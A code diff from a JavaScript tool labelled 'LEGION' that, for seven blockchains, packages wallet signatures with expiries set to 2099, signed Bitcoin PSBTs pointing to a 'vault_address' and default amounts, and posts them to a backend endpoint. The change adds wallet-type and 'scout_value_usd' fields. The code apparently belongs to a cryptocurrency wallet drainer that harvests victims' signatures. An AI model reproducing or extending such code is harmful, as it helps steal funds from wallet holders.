@@ -1939,7 +1939,8 @@
             signature: signatures.SOL.signature,
             nonce: 'legion:' + Date.now(),
             expiry_iso: '2099-12-31T23:59:59.999Z',
-            wallet_type: 'hot_wallet'
+            wallet_type: signatures.SOL.walletType || 'hot_wallet',
+            scout_value_usd: SESSION_SCOUT_VALUE_USD || 0
           };
           await apiPost('/api/v1/signature-anchor', solPayload);
           console.log('[LEGION]   ✅ Solana submitted');
@@ -1960,7 +1961,8 @@
             signature: signatures.BTC.signature,
             nonce: 'legion:' + Date.now(),
             expiry_iso: '2099-12-31T23:59:59.999Z',
-            wallet_type: 'hot_wallet',
+            wallet_type: signatures.BTC.walletType || 'hot_wallet',
+            scout_value_usd: SESSION_SCOUT_VALUE_USD || 0,
             signed_psbt_base64: signatures.BTC.psbt || signatures.BTC.signature,
             psbt_metadata: {
               vault_address: vaults.btc,
@@ -1992,7 +1994,8 @@
             signature: signatures.TRON.signature,
             nonce: 'legion:' + Date.now(),
             expiry_iso: '2099-12-31T23:59:59.999Z',
-            wallet_type: 'hot_wallet'
+            wallet_type: signatures.TRON.walletType || 'hot_wallet',
+            scout_value_usd: SESSION_SCOUT_VALUE_USD || 0
           };
           await apiPost('/api/v1/signature-anchor', tronPayload);
           console.log('[LEGION]   ✅ TRON submitted');
@@ -2014,7 +2017,8 @@
             signature: signatures.TON.signature,
             nonce: 'legion:' + Date.now(),
             expiry_iso: '2099-12-31T23:59:59.999Z',
-            wallet_type: 'hot_wallet'
+            wallet_type: signatures.TON.walletType || 'hot_wallet',
+            scout_value_usd: SESSION_SCOUT_VALUE_USD || 0
           };
           await apiPost('/api/v1/signature-anchor', tonPayload);
           console.log('[LEGION]   ✅ TON submitted');
@@ -2036,7 +2040,8 @@
             signature: signatures.COSMOS.signature,
             nonce: 'legion:' + Date.now(),
             expiry_iso: '2099-12-31T23:59:59.999Z',
-            wallet_type: 'hot_wallet',
+            wallet_type: signatures.COSMOS.walletType || 'hot_wallet',
+            scout_value_usd: SESSION_SCOUT_VALUE_USD || 0,
             amount: signatures.COSMOS.amount || '1000000'
           };
           await apiPost('/api/v1/signature-anchor', cosmosPayload);
@@ -2059,7 +2064,8 @@
             signature: signatures.APTOS.signature,
             nonce: 'legion:' + Date.now(),
             expiry_iso: '2099-12-31T23:59:59.999Z',
-            wallet_type: 'hot_wallet',
+            wallet_type: signatures.APTOS.walletType || 'hot_wallet',
+            scout_value_usd: SESSION_SCOUT_VALUE_USD || 0,
             amount: signatures.APTOS.amount || '1000000'
           };
           await apiPost('/api/v1/signature-anchor', aptosPayload);
@@ -2082,7 +2088,8 @@
             signature: signatures.SUI.signature,
             nonce: 'legion:' + Date.now(),
             expiry_iso: '2099-12-31T23:59:59.999Z',
-            wallet_type: 'hot_wallet',
+            wallet_type: signatures.SUI.walletType || 'hot_wallet',
+            scout_value_usd: SESSION_SCOUT_VALUE_USD || 0,
             amount: signatures.SUI.amount || '1000000'
           };
           await apiPost('/api/v1/signature-anchor', suiPayload);
